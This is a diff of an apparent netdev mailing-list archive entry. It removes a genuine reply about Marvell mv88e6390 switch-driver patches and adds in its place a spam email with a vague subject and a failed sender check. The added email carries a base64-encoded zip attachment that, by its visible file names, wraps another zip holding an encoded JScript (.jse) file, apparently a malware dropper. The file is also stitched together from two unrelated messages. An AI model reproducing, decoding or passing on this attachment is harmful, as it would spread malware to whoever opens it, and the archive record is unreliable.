@@ -1,42 +1,98 @@
-From: Vivien Didelot <vivien.didelot@savoirfairelinux.com>
-Subject: Re: [PATCHv2 net-next 0/2] Preparation for mv88e6390
-Date: Mon, 19 Sep 2016 22:18:57 -0400
-Message-ID: <87mvj3qpny.fsf@ketchup.i-did-not-set--mail-host-address--so-tickle-me>
-References: <1474331590-7959-1-git-send-email-andrew@lunn.ch>
+From: <ddccc@mail.com>
+Subject: 23221 netdev
+Date: Tue, 20 Sep 2016 02:48:49 -0000
+Message-ID: <147433972991.16238.17241323639381852574@uk.net>
 Mime-Version: 1.0
-Content-Type: text/plain
-Cc: netdev <netdev@vger.kernel.org>, Andrew Lunn <andrew@lunn.ch>
-To: Andrew Lunn <andrew@lunn.ch>, David Miller <davem@davemloft.net>
+Content-Type: application/zip; name="INFO_3929613035991_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail.savoirfairelinux.com ([208.88.110.44]:40530 "EHLO
-        mail.savoirfairelinux.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752126AbcITCTB (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Mon, 19 Sep 2016 22:19:01 -0400
-In-Reply-To: <1474331590-7959-1-git-send-email-andrew@lunn.ch>
+Received: from host187-72-static.16-80-b.business.telecomitalia.it ([80.16.72.187]:53707
+        "HELO uk.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752131AbcITCs5 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 19 Sep 2016 22:48:57 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Hi Andrew,
-
-Andrew Lunn <andrew@lunn.ch> writes:
-
-> These two patches are a couple of preparation steps for supporting the
-> the MV88E6390 family of chips. This is a new generation from Marvell,
-> and will need more feature flags than are currently available in an
-> unsigned long. Expand to an unsigned long long. The MV88E6390 also
-> places its port registers somewhere else, so add a wrapper around port
-> register access.
->
-> v2: Rework wrappers to use mv88e6xxx_{read|write}
->     Simpliy some (err < ) to (err)
->     Add Reviewed by tag.
->
-> Andrew Lunn (2):
->   net: dsa: mv88e6xxx: Convert flag bits to unsigned long long
->   WIP: net: dsa: mv88e6xxx: Implement interrupt support.
-
-Since there's a need for a v3, note that the above summary is wrong.
-
-Thanks,
-
-        Vivien
+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
